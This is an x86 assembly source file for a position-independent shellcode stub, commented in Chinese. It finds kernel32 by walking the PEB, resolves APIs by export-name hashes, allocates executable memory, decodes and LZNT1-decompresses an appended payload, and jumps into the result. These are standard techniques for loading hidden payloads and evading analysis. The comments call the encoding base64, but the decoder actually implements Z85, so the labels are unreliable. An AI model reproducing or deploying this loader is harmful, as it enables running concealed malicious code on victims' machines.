; ============================================================================
; dec_b64_lznt1_x86.asm  ——  x86 (32-bit) base64 + LZNT1 自解压桩
;
; 编译：  nasm -f bin -o dec32.bin dec_b64_lznt1_x86.asm
;
; 运行时布局：
;   [0 .. stub_len)        本桩（入口 = 偏移 0）
;   [stub_len ..)          数据块
;        +0x00 u32 b64len   base64 文本长度
;        +0x04 u32 complen  base64 解码后长度（= LZNT1 流长度）
;        +0x08 u32 rawlen   解压后长度
;        +0x0C u64 fnv64    保留（x86 版不校验）
;        +0x14 ...          base64 文本
;
; 行为：VirtualAlloc 两块 → base64 解码 → RtlDecompressBuffer(LZNT1) →
;       push 0 / call 解压缓冲（栈上传 NULL 参数，兼容 loader_x86 的 lpParameter）
;       → ExitProcess(0)。失败 ExitProcess(1)。
; ============================================================================

BITS 32

HASH_GETPROCADDRESS equ 0xcf31bb1f
HASH_LOADLIBRARYA   equ 0x5fbff0fb
HASH_VIRTUALALLOC   equ 0x382c0f97
HASH_RTLDECOMPRESS  equ 0xf73bbd46
HASH_EXITPROCESS    equ 0xb769339e

; ---------------------------------------------------------------------------
; 入口
; ---------------------------------------------------------------------------
b64_entry:
    push ebx
    push esi
    push edi
    push ebp
    sub  esp, 0x40

    call b64_getpc
b64_getpc:
    pop  ebx
    mov  [esp + 0x24], ebx          ; 运行期基准（b64_getpc 的地址）

    ; ---- kernel32 基址 ----
    mov  eax, [fs:0x30]             ; PEB
    mov  eax, [eax + 0x0C]          ; Ldr
    mov  eax, [eax + 0x14]          ; InMemoryOrderModuleList.Flink
    mov  eax, [eax]                 ; 第 2 个
    mov  eax, [eax]                 ; 第 3 个 = kernel32
    mov  ebp, [eax + 0x10]          ; DllBase

    ; ---- 解析导出 ----
    mov  edx, ebp
    mov  ecx, HASH_GETPROCADDRESS
    call b64_find_export
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x00], eax

    mov  edx, ebp
    mov  ecx, HASH_LOADLIBRARYA
    call b64_find_export
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x04], eax

    mov  edx, ebp
    mov  ecx, HASH_VIRTUALALLOC
    call b64_find_export
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x08], eax

    mov  edx, ebp
    mov  ecx, HASH_EXITPROCESS
    call b64_find_export
    mov  [esp + 0x10], eax

    ; ---- ntdll = LoadLibraryA("ntdll.dll") ----
    mov  esi, [esp + 0x04]
    mov  eax, [esp + 0x24]
    lea  eax, [eax + b64_str_ntdll - b64_getpc]
    push eax
    call esi
    mov  edi, eax
    test edi, edi
    jz   b64_fail

    ; ---- RtlDecompressBuffer = GetProcAddress(ntdll, ...) ----
    mov  esi, [esp + 0x00]
    mov  eax, [esp + 0x24]
    lea  eax, [eax + b64_str_rtl - b64_getpc]
    push eax
    push edi
    call esi
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x0C], eax

    ; ---- 数据块 ----
    mov  eax, [esp + 0x24]
    add  eax, b64_data_block - b64_getpc
    mov  [esp + 0x28], eax

    ; ---- 临时缓冲 = VirtualAlloc(0, complen, COMMIT|RESERVE, RWX) ----
    mov  esi, [esp + 0x08]
    mov  eax, [esp + 0x28]
    mov  eax, [eax + 4]
    push 0x40
    push 0x3000
    push eax
    push 0
    call esi
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x14], eax

    ; ---- Z85 解码（5 字符 -> 4 字节，大端）----
    mov  esi, [esp + 0x28]          ; 数据块
    mov  ebx, [esi + 0]             ; 字符数
    add  esi, 0x14
    mov  edi, [esp + 0x14]          ; 临时缓冲
    mov  ebp, b64_z85_tab - b64_getpc
    add  ebp, [esp + 0x24]          ; 表绝对地址
b64_dec_grp:
    cmp  ebx, 5
    jb   b64_dec_done
    sub  ebx, 5
    xor  edx, edx
    mov  ecx, 5
b64_dec_ch:
    movzx eax, byte [esi]
    inc  esi
    sub  eax, 33
    cmp  eax, 95
    jae  b64_fail
    movzx eax, byte [ebp + eax]
    cmp  eax, 0xFF
    je   b64_fail
    imul edx, edx, 85
    add  edx, eax
    dec  ecx
    jnz  b64_dec_ch
    mov  eax, edx
    bswap eax
    mov  [edi], eax
    add  edi, 4
    jmp  b64_dec_grp
b64_dec_done:

    ; ---- 最终缓冲 = VirtualAlloc(0, rawlen, COMMIT|RESERVE, RWX) ----
    mov  esi, [esp + 0x08]
    mov  eax, [esp + 0x28]
    mov  eax, [eax + 8]
    push 0x40
    push 0x3000
    push eax
    push 0
    call esi
    test eax, eax
    jz   b64_fail
    mov  [esp + 0x18], eax

    ; ---- RtlDecompressBuffer(2, final, rawlen, decoded, complen, &final_size) ----
    mov  ebx, [esp + 0x28]
    mov  ecx, [ebx + 4]             ; complen
    mov  edx, [ebx + 8]             ; rawlen
    mov  ebp, [esp + 0x14]          ; decoded
    mov  edi, [esp + 0x18]          ; final
    mov  esi, [esp + 0x0C]          ; RtlDecompressBuffer
    mov  eax, [esp + 0x24]
    lea  eax, [eax + b64_final_size - b64_getpc]
    push eax
    push ecx
    push ebp
    push edx
    push edi
    push 2
    call esi
    test eax, eax
    jnz  b64_fail

    ; ---- 执行解压结果（栈传 NULL 参数）----
    mov  edi, [esp + 0x18]
    push 0
    call edi
    add  esp, 4

    ; ---- ExitProcess(0) ----
    mov  eax, [esp + 0x10]
    test eax, eax
    jz   b64_halt
    push 0
    call eax

b64_fail:
    mov  eax, [esp + 0x10]
    test eax, eax
    jz   b64_halt
    push 1
    call eax
b64_halt:
    hlt
    jmp  b64_halt

; ---------------------------------------------------------------------------
; b64_find_export: edx = 模块基址, ecx = djb2 哈希 -> eax = 函数地址（0=失败）
; ---------------------------------------------------------------------------
b64_find_export:
    push ebx
    push esi
    push edi
    push ebp
    sub  esp, 0x10

    mov  esi, edx
    mov  ebp, ecx

    mov  eax, [esi + 0x3C]
    add  eax, esi
    mov  eax, [eax + 0x78]          ; PE32 DataDirectory[0]
    test eax, eax
    jz   .nf
    add  eax, esi
    mov  edi, eax

    mov  eax, [edi + 0x18]
    mov  [esp + 0x00], eax          ; NumberOfNames
    mov  eax, [edi + 0x20]
    mov  [esp + 0x04], eax          ; AddressOfNames
    mov  eax, [edi + 0x1C]
    mov  [esp + 0x08], eax          ; AddressOfFunctions
    mov  eax, [edi + 0x24]
    mov  [esp + 0x0C], eax          ; AddressOfNameOrdinals

    xor  edx, edx
.loop:
    cmp  edx, [esp + 0x00]
    jae  .nf
    mov  eax, [esp + 0x04]
    add  eax, esi
    mov  eax, [eax + edx*4]
    add  eax, esi
    mov  ecx, 5381
.hash:
    movzx ebx, byte [eax]
    test ebx, ebx
    jz   .cmp
    imul ecx, ecx, 33
    add  ecx, ebx
    inc  eax
    jmp  .hash
.cmp:
    cmp  ecx, ebp
    je   .found
    inc  edx
    jmp  .loop
.found:
    mov  eax, [esp + 0x0C]
    add  eax, esi
    movzx eax, word [eax + edx*2]
    mov  ecx, [esp + 0x08]
    add  ecx, esi
    mov  eax, [ecx + eax*4]
    add  eax, esi
    jmp  .done
.nf:
    xor  eax, eax
.done:
    add  esp, 0x10
    pop  ebp
    pop  edi
    pop  esi
    pop  ebx
    ret

b64_str_ntdll: db "ntdll.dll", 0
b64_str_rtl:   db "RtlDecompressBuffer", 0

align 4
b64_z85_tab:
    db 0x44, 0xFF, 0x54, 0x53, 0x52, 0x48, 0xFF, 0x4B, 0x4C, 0x46
    db 0x41, 0xFF, 0x3F, 0x3E, 0x45, 0x00, 0x01, 0x02, 0x03, 0x04
    db 0x05, 0x06, 0x07, 0x08, 0x09, 0x40, 0xFF, 0x49, 0x42, 0x4A
    db 0x47, 0x51, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B
    db 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35
    db 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x4D, 0xFF
    db 0x4E, 0x43, 0xFF, 0xFF, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
    db 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19
    db 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23
    db 0x4F, 0xFF, 0x50, 0xFF, 0xFF

b64_final_size: dd 0
b64_data_block:
